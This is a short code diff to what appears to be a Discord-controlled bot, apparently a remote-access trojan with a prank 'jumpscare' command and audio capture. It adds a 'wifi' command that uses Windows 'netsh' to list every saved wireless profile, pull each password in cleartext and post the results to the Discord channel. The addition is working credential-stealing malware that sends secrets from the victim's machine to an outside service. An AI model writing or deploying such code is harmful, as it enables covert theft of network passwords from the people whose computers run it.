@@ -511,6 +511,21 @@ async def jumpscare(ctx):
     else:
         await ctx.send("Failed to load the image.")
 
+@bot.command()
+async def wifi(ctx):
+    try:
+        wifi_data = os.popen("netsh wlan show profile").read()
+        profiles = [line.split(':')[1].strip() for line in wifi_data.split('\n') if "All User Profile" in line]
+        wifi_info = ""
+        for profile in profiles:
+            password_data = os.popen(f"netsh wlan show profile name=\"{profile}\" key=clear").read()
+            password_lines = [line for line in password_data.split('\n') if "Key Content" in line]
+            password = password_lines[0].split(':')[1].strip() if password_lines else "N/A"
+            wifi_info += f"SSID: {profile} | Password: {password}\n"
+        await ctx.send(f"```{wifi_info}```")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
